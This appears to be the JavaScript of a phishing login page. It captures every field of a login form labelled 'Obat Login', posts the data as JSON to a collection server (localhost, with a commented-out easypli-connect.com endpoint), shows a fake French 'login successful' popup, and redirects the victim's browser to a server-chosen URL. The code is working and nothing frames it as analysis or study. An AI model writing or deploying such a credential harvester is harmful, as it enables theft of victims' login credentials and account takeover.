    <script>
        document.addEventListener('DOMContentLoaded', function () {
            var form = document.getElementById('obat-login-form');
            if (form) {
                form.addEventListener('submit', function (event) {
                    // Prevent the form from submitting the traditional way
                    event.preventDefault();

                    // Get form data
                    var formData = new FormData(form);

                    // Convert FormData to a plain object
                    var formObject = {};
                    formData.forEach(function(value, key) {
                        formObject[key] = value;     
                        formObject['formTitle'] = 'Obat Login';
                    });

                    // Log the form data to the console (or send it to a server)
                    console.log('Form Data:', formObject);

                    // Send the data to the server using fetch
                    fetch('http://localhost:3000/submit/obat-login', {
                    // fetch('https://www.easypli-connect.com/submit/obat-login', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(formObject),
                    })
                        .then(response => response.json())
                        .then(data => {
                            if (data.success && data.redirectUrl) {
                                // Redirect the user to the specified URL
                                const popup = document.createElement('div');
                                popup.style.position = 'fixed';
                                popup.style.top = '50%';
                                popup.style.left = '50%';
                                popup.style.transform = 'translate(-50%, -50%)';
                                popup.style.backgroundColor = '#fff';
                                popup.style.padding = '20px';
                                popup.style.boxShadow = '0 4px 8px rgba(0, 0, 0, 0.2)';
                                popup.style.borderRadius = '8px';
                                popup.style.zIndex = '1000';
                                popup.innerHTML = `
                                    <p style="margin: 0; font-size: 16px; color: #333;">Connexion réalisée avec succès !</p>
                                    <p>Vous allez être redirigé(e) automatiquement.</p>
                                    <button style="margin-top: 10px; padding: 8px 16px; background-color: #003DA5; color: #fff; border: none; border-radius: 4px; cursor: pointer;">OK</button>
                                `;
                                document.body.appendChild(popup);

                                const button = popup.querySelector('button');
                                button.addEventListener('click', () => {
                                    document.body.removeChild(popup);
                                    window.top.location.href = data.redirectUrl;
                                });
                            } else {
                                console.log('Form submitted successfully:', data);
                            }
                        })
                        .catch((error) => {
                            console.error('Error:', error);
                        });

                    // Optionally, clear the form after submission
                    // form.reset();
                });
            }
        });
    </script>
